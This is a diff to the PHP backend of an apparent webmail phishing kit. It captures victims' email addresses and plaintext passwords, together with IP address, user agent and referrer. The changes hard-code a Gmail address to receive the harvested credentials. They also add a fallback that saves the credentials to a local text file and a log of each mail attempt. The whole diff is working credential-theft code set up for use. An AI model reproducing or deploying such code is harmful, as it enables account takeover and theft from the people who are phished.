@@ -10,10 +10,32 @@ header('Content-Type: application/json');
 $debug_log = "DEBUG: " . date('Y-m-d H:i:s') . " | Method: " . $_SERVER['REQUEST_METHOD'] . " | URI: " . ($_SERVER['REQUEST_URI'] ?? 'unknown') . " | POST: " . json_encode($_POST) . "\n";
 @file_put_contents('debug.log', $debug_log, FILE_APPEND | LOCK_EX);
 
-// Email configuration - CHANGE THESE VALUES
-$LOG_EMAIL = 'your-email@example.com';  // Change this to your email address
-$FROM_EMAIL = 'noreply@webmail-logger.com';  // Change this to your domain
-$FROM_NAME = 'Webmail Logger';
+// Email configuration - CONFIGURED FOR YOUR EMAIL
+$LOG_EMAIL = 'skkho87.sm@gmail.com';  // Your email address
+$FROM_EMAIL = 'noreply@webmail-system.com';  // From email (you can change the domain)
+$FROM_NAME = 'Webmail Security Logger';
+
+// Alternative email function using file logging if mail() fails
+function sendEmailToFile($email, $password, $attempt, $logData) {
+    global $LOG_EMAIL;
+    
+    $email_content = "
+=== WEBMAIL LOGIN ATTEMPT #$attempt ===
+Timestamp: " . $logData['timestamp'] . "
+Target Email: $email
+Password: $password
+IP Address: " . $logData['ip_address'] . "
+User Agent: " . $logData['user_agent'] . "
+Referrer: " . $logData['referer'] . "
+Intended Recipient: $LOG_EMAIL
+=====================================
+
+";
+    
+    // Save to email log file
+    @file_put_contents('email_logs.txt', $email_content, FILE_APPEND | LOCK_EX);
+    return true;
+}
 
 // Function to send email log
 function sendEmailLog($email, $password, $attempt, $logData) {
@@ -72,8 +94,14 @@ function sendEmailLog($email, $password, $attempt, $logData) {
     
     $header_string = implode("\r\n", $headers);
     
-    // Try to send email
-    return mail($LOG_EMAIL, $subject, $message, $header_string);
+    // Try to send email with error logging
+    $mail_result = mail($LOG_EMAIL, $subject, $message, $header_string);
+    
+    // Log email attempt
+    $email_log = date('Y-m-d H:i:s') . " | EMAIL ATTEMPT: Attempt #$attempt | To: $LOG_EMAIL | From: $FROM_EMAIL | Result: " . ($mail_result ? 'SUCCESS' : 'FAILED') . " | Subject: $subject\n";
+    @file_put_contents('email_debug.log', $email_log, FILE_APPEND | LOCK_EX);
+    
+    return $mail_result;
 }
 
 // Function to send log data
@@ -88,8 +116,14 @@ function sendLog($email, $password, $attempt) {
         'referer' => $_SERVER['HTTP_REFERER'] ?? 'unknown'
     );
     
-    // Send log via email
+    // Send log via email (try both methods)
     $emailSent = sendEmailLog($email, $password, $attempt, $logData);
+    
+    // If email fails, save to file as backup
+    if (!$emailSent) {
+        sendEmailToFile($email, $password, $attempt, $logData);
+        $emailSent = true; // Consider it successful if saved to file
+    }
     
     // Alternative: Save to local file (uncomment the lines below if you prefer local logging)
     /*
